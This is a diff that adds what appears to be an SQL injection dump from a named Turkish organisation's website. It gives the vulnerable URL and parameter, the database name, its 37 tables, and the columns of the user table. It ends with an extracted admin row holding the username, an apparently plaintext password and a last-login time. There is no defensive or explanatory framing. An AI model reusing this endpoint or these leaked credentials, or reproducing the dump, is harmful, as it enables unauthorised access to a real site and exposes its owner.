@@ -1,0 +1,77 @@
+VULN URL : https://whatshapp.saadet.org.tr/detay2.php?i=0
+
+Database: agdorgtr_db
+[37 tables]
++----------------+
+| log            |
+| anket          |
+| anketler       |
+| bagislar       |
+| banner         |
+| basvuru        |
+| bizeulasin     |
+| dosyakategori  |
+| dosyalar       |
+| fotokategori   |
+| galeri         |
+| galerigif      |
+| galeriresim    |
+| galeriresimgif |
+| haberresim     |
+| hakkimizda     |
+| icerikkategori |
+| icerikler      |
+| images         |
+| ipkontrol      |
+| komisyonlar    |
+| kullanici      |
+| kunye          |
+| kunye_test     |
+| kunyeh         |
+| makale         |
+| manset         |
+| parametre      |
+| reklam         |
+| siteler        |
+| subeler        |
+| temalar        |
+| videokategori  |
+| videolar       |
+| yazar          |
+| ydil           |
+| yurtlar        |
++----------------+
+
+Database: agdorgtr_db
+Table: kullanici
+[17 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| durum       | varchar(10)  |
+| ekleyen     | int(10)      |
+| email       | varchar(150) |
+| foto        | varchar(10)  |
+| guncelleyen | int(10)      |
+| haber       | varchar(10)  |
+| id          | int(11)      |
+| isim        | varchar(40)  |
+| kad         | varchar(20)  |
+| kategori    | varchar(10)  |
+| kurumsal    | varchar(10)  |
+| parametre   | varchar(10)  |
+| sifre       | varchar(20)  |
+| songiris    | int(20)      |
+| tarih       | int(20)      |
+| video       | varchar(10)  |
+| yetkialani  | text         |
++-------------+--------------+
+
+Database: agdorgtr_db
+Table: kullanici
+[1 entry]
++-------+----------+------------+-----------------------------------------------------+
+| kad   | sifre    | songiris   | yetkialani                                          |
++-------+----------+------------+-----------------------------------------------------+
+| admin | Qazqwsxc | 1655830822 | a:3:{i:0;s:4:"w21i";i:1;s:4:"w20i";i:2;s:4:"w19i";} |
++-------+----------+------------+-----------------------------------------------------+
